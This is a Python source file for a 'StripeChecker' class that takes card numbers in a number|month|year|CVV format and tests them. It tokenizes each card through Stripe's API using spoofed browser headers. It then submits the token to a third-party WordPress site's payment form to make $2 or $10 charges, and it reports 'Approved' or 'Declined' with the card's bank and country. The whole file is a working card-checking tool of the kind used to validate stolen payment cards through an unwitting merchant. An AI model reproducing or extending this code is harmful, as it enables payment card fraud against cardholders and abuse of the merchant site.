import requests
import uuid
import time
from config import STRIPE_KEY, logger

class StripeChecker:
    """Stripe Payment Gateway Checker"""
    
    @staticmethod
    def check_gateway_status():
        """Check if Stripe gateway is accessible"""
        try:
            urls = [
                "https://api.stripe.com/v1/payment_methods",
                "https://js.stripe.com/v3/",
                "https://checkout.stripe.com/api/bootstrap"
            ]
            
            results = []
            for url in urls:
                try:
                    response = requests.head(url, timeout=5)
                    results.append({
                        'url': url,
                        'status': response.status_code,
                        'accessible': response.status_code in [200, 403, 405]
                    })
                except:
                    results.append({
                        'url': url,
                        'status': 0,
                        'accessible': False
                    })
            
            accessible_count = sum(1 for r in results if r['accessible'])
            
            status_map = {
                3: '🟢 Online',
                2: '🟡 Partially Online', 
                1: '🟡 Partially Online',
                0: '🔴 Offline'
            }
            
            return {
                'gateway': 'Stripe',
                'status': status_map.get(accessible_count, '🔴 Offline'),
                'accessible': accessible_count >= 1,
                'details': results
            }
            
        except Exception as e:
            logger.error(f"Stripe status check error: {e}")
            return {
                'gateway': 'Stripe',
                'status': '🔴 Error',
                'accessible': False,
                'error': str(e)
            }
    
    @staticmethod
    def execute_2usd_charge_logic(card_details: str):
        """$2 Stripe Charge - FAST VERSION"""
        try:
            cc, mm, yy, cvv = card_details.split('|')
            
            guid = str(uuid.uuid4())
            muid = str(uuid.uuid4())
            sid = str(uuid.uuid4())

            stripe_headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': 'Mozilla/5.0'
            }

            stripe_data = (
                f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}'
                f'&guid={guid}&muid={muid}&sid={sid}&pasted_fields=number'
                f'&payment_user_agent=stripe.js&key={STRIPE_KEY}'
            )

            resp = requests.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=stripe_headers,
                data=stripe_data,
                timeout=10
            )

            if resp.status_code != 200:
                return {"status": "Declined", "message": "Stripe rejected card"}

            stripe_json = resp.json()
            pm_id = stripe_json.get("id")

            if not pm_id:
                return {"status": "Declined", "message": "No payment method returned"}

            card_info = stripe_json.get("card", {})
            bin_info = {
                "brand": card_info.get("brand", "N/A"),
                "type": card_info.get("funding", "N/A"),
                "bank": card_info.get("issuer", "N/A"),
                "country": card_info.get("country", "N/A"),
            }

        except Exception as e:
            logger.error(f"Stripe 2USD charge error: {e}")
            return {"status": "Error", "message": f"Stripe error: {e}"}

        try:
            ajax_headers = {
                'authority': 'allcoughedup.com',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://allcoughedup.com',
                'referer': 'https://allcoughedup.com/registry/',
                'user-agent': 'Mozilla/5.0',
            }

            ajax_data = {
                'data': f'__stripe_payment_method_id={pm_id}',
                'action': 'fluentform_submit',
                'form_id': '4',
            }

            ajax_resp = requests.post(
                'https://allcoughedup.com/wp-admin/admin-ajax.php',
                headers=ajax_headers,
                data=ajax_data,
                timeout=10
            )

            if "success" in ajax_resp.text.lower():
                return {"status": "Approved", "message": "$2 Charged Successfully", **bin_info}

            return {"status": "Declined", "message": "$2 Charge Failed", **bin_info}

        except Exception as e:
            logger.error(f"Website error in 2USD charge: {e}")
            return {"status": "Error", "message": f"Website error: {e}"}
    
    @staticmethod
    def execute_10usd_charge_logic(card_details: str):
        """$10 Stripe Charge - FAST VERSION"""
        try:
            cc, mm, yy, cvv = card_details.split('|')
            
            guid = str(uuid.uuid4())
            muid = str(uuid.uuid4())
            sid = str(uuid.uuid4())

            stripe_headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': 'Mozilla/5.0'
            }

            stripe_data = (
                f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}'
                f'&guid={guid}&muid={muid}&sid={sid}&pasted_fields=number'
                f'&payment_user_agent=stripe.js&key={STRIPE_KEY}'
            )

            resp = requests.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=stripe_headers,
                data=stripe_data,
                timeout=10
            )

            if resp.status_code != 200:
                return {"status": "Declined", "message": "Stripe rejected card"}

            stripe_json = resp.json()
            pm_id = stripe_json.get("id")

            if not pm_id:
                return {"status": "Declined", "message": "No payment method returned"}

            card_info = stripe_json.get("card", {})
            bin_info = {
                "brand": card_info.get("brand", "N/A"),
                "type": card_info.get("funding", "N/A"),
                "bank": card_info.get("issuer", "N/A"),
                "country": card_info.get("country", "N/A"),
            }

        except Exception as e:
            logger.error(f"Stripe 10USD charge error: {e}")
            return {"status": "Error", "message": f"Stripe error: {e}"}

        try:
            ajax_headers = {
                'authority': 'allcoughedup.com',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://allcoughedup.com',
                'referer': 'https://allcoughedup.com/registry/',
                'user-agent': 'Mozilla/5.0',
            }

            ajax_data = {
                'data': f'__fluent_form_embded_post_id=3612&_fluentform_4_fluentformnonce=3d8d6164fa&_wp_http_referer=%2Fregistry%2F&names%5Bfirst_name%5D=Customer&email=customer%40gmail.com&custom-payment-amount=10&description=10USD+Charge&payment_method=stripe&__stripe_payment_method_id={pm_id}',
                'action': 'fluentform_submit',
                'form_id': '4',
            }

            ajax_resp = requests.post(
                'https://allcoughedup.com/wp-admin/admin-ajax.php',
                headers=ajax_headers,
                data=ajax_data,
                timeout=10
            )

            if "success" in ajax_resp.text.lower():
                return {"status": "Approved", "message": "$10 Charged Successfully", **bin_info}

            return {"status": "Declined", "message": "$10 Charge Failed", **bin_info}

        except Exception as e:
            logger.error(f"Website error in 10USD charge: {e}")
            return {"status": "Error", "message": f"Website error: {e}"}